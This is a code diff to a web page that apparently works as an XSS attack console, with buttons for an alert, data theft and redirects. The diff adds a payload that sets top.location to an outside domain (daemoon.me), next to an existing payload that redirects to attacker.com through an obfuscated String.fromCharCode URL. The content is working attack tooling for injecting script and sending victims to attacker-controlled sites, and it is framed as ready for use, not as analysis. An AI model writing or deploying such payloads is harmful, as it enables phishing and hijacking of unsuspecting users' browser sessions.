@@ -114,6 +114,7 @@
             <button class="btn-alert" onclick="sendAlert()">2. XSS Alert</button>
             <button class="btn-steal" onclick="sendSteal()">3. Steal Data</button>
             <button class="btn-phish" onclick="sendPhish()">4. Redirect</button>
+            <button class="btn-phish" onclick="sendTopRedirect()">5. Top Redirect</button>
         </div>
 
         <div class="status" id="status"></div>
@@ -230,6 +231,12 @@ function sendSteal() {
 function sendPhish() {
     showStatus('Redirecting to attacker.com...');
     var xss = 'location.href=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,99,111,109)';
+    sendPayload(xss);
+}
+
+function sendTopRedirect() {
+    showStatus('Redirecting main window to daemoon.me...');
+    var xss = 'top.location="https://daemoon.me"';
     sendPayload(xss);
 }
 </script>
